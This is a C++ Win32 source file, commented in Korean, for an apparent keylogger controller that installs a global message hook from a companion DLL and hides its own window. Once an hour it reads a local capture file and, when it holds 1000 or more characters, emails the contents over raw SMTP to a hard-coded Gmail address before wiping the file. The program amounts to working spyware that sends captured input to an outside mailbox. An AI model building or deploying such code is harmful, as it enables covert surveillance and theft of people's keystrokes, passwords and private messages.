////////////////////////////////////////////////////////////////////////////////////
// ysoftman
// 윈도우 메시지 후킹 EXE
////////////////////////////////////////////////////////////////////////////////////
//#pragma comment(linker, "/subsystem:console")	// 콘솔 프로그램 시작시
#pragma comment(linker, "/subsystem:windows")	// 윈도우 프로그램 시작시

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN		// Exclude rarely-used stuff from Windows headers

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "MsgHookDLL.lib")

#include <winsock2.h>
#include <stdio.h>
#include <winuser.h>
#include <windowsx.h>
#include <windows.h>
#include <stdlib.h>
#include <malloc.h>
#include <memory.h>
#include <tchar.h>

#ifndef __MSGHOOK_H__
#define __MSGHOOK_H__

extern "C" __declspec(dllexport) LRESULT CALLBACK GetMsgHookProc(int nCode, WPARAM wParam, LPARAM lParam);
extern "C" __declspec(dllexport) BOOL InstallHook();
extern "C" __declspec(dllexport) BOOL UninstallHook();

#endif


#define MAX_LOADSTRING 100

#define IDC_MYICON                      2
#define IDD_MSGHOOK_DIALOG              102
#define IDD_ABOUTBOX                    103
#define IDS_APP_TITLE                   103
#define IDM_ABOUT                       104
#define IDM_EXIT                        105
#define IDS_HELLO                       106
#define IDI_MSGHOOK                     107
#define IDI_SMALL                       108
#define IDC_MSGHOOK                     109
#define IDR_MAINFRAME                   128
#define IDR_WAVE1                       129
#define IDC_STATIC                      -1

// Global Variables:
HINSTANCE hInst;
LPSTR lpszClass = "BILL's Hook Program";
// Foward declarations of functions included in this code module:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK	About(HWND, UINT, WPARAM, LPARAM);


int SendMail(char *EmailServer, char *EmailTo, char *EmailFrom, char *EmailSubject, char *EmailMsg);

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
	MSG msg;

	// Initialize global strings
	MyRegisterClass(hInstance);

	// Perform application initialization:
	if (!InitInstance (hInstance, nCmdShow)) 
	{
		return FALSE;
	}

	// Main message loop:
	while (GetMessage(&msg, NULL, 0, 0)) 
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return msg.wParam;
}

ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX); 

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= (WNDPROC)WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, (LPCTSTR)IDI_MSGHOOK);
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= (LPCSTR)IDC_MSGHOOK;
	wcex.lpszClassName	= lpszClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, (LPCTSTR)IDI_SMALL);

	return RegisterClassEx(&wcex);
}

BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // Store instance handle in our global variable

   hWnd = CreateWindow(lpszClass, "Hook Program", 
	   WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
      0, 0, 200, 80, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }

   //ShowWindow(hWnd, nCmdShow);
   ShowWindow(hWnd, SW_HIDE);
   UpdateWindow(hWnd);

   return TRUE;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;
	//TCHAR szHello[MAX_LOADSTRING];
	//LoadString(hInst, IDS_HELLO, szHello, MAX_LOADSTRING);

	BOOL bHookState = FALSE;

	int freadindex = 0;
	long len = 0;
	char *buf = NULL;
	FILE *fpResult = NULL;
	
	switch (message) 
	{
		case WM_CREATE:
			bHookState = InstallHook();
			if (bHookState == FALSE)
			{
				MessageBox(hWnd, "InstallHook Failed.", "Error", MB_OK);
				ExitProcess(1);
			}

			// 타이머 설정(3600초 단위로 작동하도록 설정)
			SetTimer(hWnd, 1, 3600000, NULL);
			// 타이머 메세지 날리기
			SendMessage(hWnd, WM_TIMER, FALSE, NULL);
		
		case WM_TIMER:
			// 파일내용을 email 로 보내기
			freadindex = 0;
			len = 0;
			buf = NULL;
			fpResult = NULL;
			fpResult = fopen("c:\\MsgHookResult.txt", "rb");
			if (fpResult == NULL)
			{
				break;
			}
			fseek(fpResult, 0, SEEK_END);
			len = ftell(fpResult);
			// 1000 글자가 넘으면 메일 발송
			if (len >= 1000)
			{
				fseek(fpResult, 0, SEEK_SET);
				buf = (char*)malloc(len);
 				freadindex = fread(buf, 1, len, fpResult);
				buf[len-1] = '\0';
				// 메일 서버를 모를 경우 콘솔(cmd.exe) 에서
				// nslookup -querytype=mx 도메인명    으로 확인 할 수 있다.
				// 예) nslookup -querytype=mx gmail.com
				// 받는 사람은 smtp 서버와 같은 도메인이어야 한다.
				SendMail(//"rcvmail10.naver.com",			// 메일서버
					"gmail-smtp-in.l.google.com",			// 메일서버
					"ysoftman@gmail.com",				// 받는 사람
					"ysoftman@naver.com",				// 보내는 사람
					"병훈이 메일입니다.",				// 제목
					buf);								// 내용
				if (buf != NULL)
				{
					free(buf);
				}
				// 1000 자가 넘었으면 파일 새로 만든다.(파일이 계속 커지는 것을 방지)
				fpResult = fopen("c:\\MsgHookResult.txt", "w");
			}
			fclose(fpResult);
			break;

		case WM_COMMAND:
			wmId    = LOWORD(wParam); 
			wmEvent = HIWORD(wParam); 
			// Parse the menu selections:
			switch (wmId)
			{
				case IDM_ABOUT:
				   DialogBox(hInst, (LPCTSTR)IDD_ABOUTBOX, hWnd, (DLGPROC)About);
				   break;
				case IDM_EXIT:
				   DestroyWindow(hWnd);
				   break;
				default:
				   return DefWindowProc(hWnd, message, wParam, lParam);
			}
			break;

		case WM_PAINT:
			hdc = BeginPaint(hWnd, &ps);
			RECT rt;
			GetClientRect(hWnd, &rt);
			DrawText(hdc, "MsgHooker Enabled.", strlen("MsgHooker Enabled."), &rt, DT_CENTER);
			EndPaint(hWnd, &ps);
			break;

		case WM_DESTROY:
			// 타이머 해제
			KillTimer(hWnd, 1);

			UninstallHook();
			PostQuitMessage(0);
			break;

		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
   }
   return 0;
}

// Mesage handler for about box.
LRESULT CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
		case WM_INITDIALOG:
				return TRUE;

		case WM_COMMAND:
			if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) 
			{
				EndDialog(hDlg, LOWORD(wParam));
				return TRUE;
			}
			break;
	}
    return FALSE;
}

// E-mail 보내는 함수
int SendMail(char *EmailServer, char *EmailTo, char *EmailFrom, char *EmailSubject, char *EmailMsg)
{
	SOCKET mySocket;
	WSADATA wsaData;
	FILE *fpSmtpLog = NULL;

	struct hostent *host;
	struct sockaddr_in dest_addr;

	int BufferSize = 300;
	int Waittime = 500;
	int Sent = 0;
	int Received = 0;
	int len1 = strlen(EmailTo);
	int len2 = strlen(EmailFrom);
	int len3 = strlen(EmailSubject);
	int len4 = strlen(EmailMsg);

	char *EmailBuf = NULL;
	char *LogBuf = NULL;

	EmailBuf = (char*)malloc(len1+len2+len3+len4+100);
	LogBuf = (char*)malloc(BufferSize+1);

	fpSmtpLog = fopen("c:\\MsgHookSMTP.log", "w");

	if (WSAStartup(0x202, &wsaData) == SOCKET_ERROR)
	{
		fputs("WSAStartup failed\n", fpSmtpLog);
		WSACleanup();
		return -1;
	}

	if ( (host=gethostbyname(EmailServer)) == NULL)
	{
		perror("gethostbyname");
		return -1;
	}

	memset(&dest_addr, 0, sizeof(dest_addr));
	memcpy(&(dest_addr.sin_addr), host->h_addr, host->h_length);

	// prepare dest_addr
	dest_addr.sin_family = host->h_addrtype;	// AF_INET from gethostbyname
	dest_addr.sin_port = htons(25);				// Port 설정
	
	// Get socket
	if ( (mySocket = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		perror("socket");
		return -1;
	}

	// Connect 
	fputs("Connecting...\n", fpSmtpLog);
	
	if (connect(mySocket, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) == -1)
	{
		perror("Connect failed.");
		return -1;
	}

	// SMTP 프로토콜을 사용하여 메일 보내기
	Sleep(Waittime);
	Received = recv(mySocket, LogBuf, BufferSize, 0);		// 환영 메세지 받음
	LogBuf[Received] = '\0';	
	fputs(LogBuf, fpSmtpLog);
	strcpy(EmailBuf, "HELO google.co.kr\n");
	fputs(EmailBuf, fpSmtpLog);
	Sent = send(mySocket, EmailBuf, strlen(EmailBuf), 0);	// 환영 메세지 보냄
	
	Sleep(Waittime);
	Received = recv(mySocket, LogBuf, BufferSize, 0);		// 응답 받음
	LogBuf[Received] = '\0';	
	fputs(LogBuf, fpSmtpLog);
	sprintf(EmailBuf, "MAIL FROM:<%s>\n", EmailFrom);
	fputs(EmailBuf, fpSmtpLog);
	Sent = send(mySocket, EmailBuf, strlen(EmailBuf), 0);	// 보내는 사람 주소 보냄
	
	Sleep(Waittime);
	Received = recv(mySocket, LogBuf, BufferSize, 0);		// 응답 받음
	LogBuf[Received] = '\0';
	fputs(LogBuf, fpSmtpLog);
	sprintf(EmailBuf, "RCPT TO:<%s>\n", EmailTo);
	fputs(EmailBuf, fpSmtpLog);
	Sent = send(mySocket, EmailBuf, strlen(EmailBuf), 0);	// 받는 사람 주소 보냄
	
	Sleep(Waittime);
	Received = recv(mySocket, LogBuf, BufferSize, 0);		// 응답 받음
	LogBuf[Received] = '\0';
	fputs(LogBuf, fpSmtpLog);
	strcpy(EmailBuf, "DATA\n");
	fputs(EmailBuf, fpSmtpLog);
	Sent = send(mySocket, EmailBuf, strlen(EmailBuf), 0);	// 메일 데이터 보냄
	
	Sleep(Waittime);
	Received = recv(mySocket, LogBuf, BufferSize, 0);		// 응답 받음
	LogBuf[Received] = '\0';
	fputs(LogBuf, fpSmtpLog);
	Sleep(Waittime);
	strcpy(EmailBuf, "To:");
	strcat(EmailBuf, EmailTo);
	strcat(EmailBuf, "\n");
	strcat(EmailBuf, "From:");
	strcat(EmailBuf, EmailFrom);
	strcat(EmailBuf, "\n");
	strcat(EmailBuf, "Subject:");
	strcat(EmailBuf, EmailSubject);
	strcat(EmailBuf, "\n");
	strcat(EmailBuf, EmailMsg);
	strcat(EmailBuf, "\r\n.\r\n");							// 메일 내용은 <CRLR>.<CRLR>로 끝나야 함.
	fputs(EmailBuf, fpSmtpLog);
	Sent = send(mySocket, EmailBuf, strlen(EmailBuf), 0);	// 제목과 내용 보냄
	
	Sleep(Waittime);
	Received = recv(mySocket, LogBuf, BufferSize, 0);		// 응답 받음
	LogBuf[Received] = '\0';
	fputs(LogBuf, fpSmtpLog);
	strcpy(EmailBuf, "QUIT\n");
	fputs(EmailBuf, fpSmtpLog);
	Sent = send(mySocket, EmailBuf, strlen(EmailBuf), 0);	// 종료 메세지 보냄
	
	Sleep(Waittime);
	Received = recv(mySocket, LogBuf, BufferSize, 0);		// 응답 받음
	LogBuf[Received] = '\0';
	fputs(LogBuf, fpSmtpLog);
	
	fclose(fpSmtpLog);

	if (EmailBuf != NULL)
	{
		free(EmailBuf);
	}
	if (LogBuf != NULL)
	{
		free(LogBuf);
	}

#ifdef WIN32
	closesocket(mySocket);
	WSACleanup();
#else
	close(mySocket);
#endif

	return 1;
}
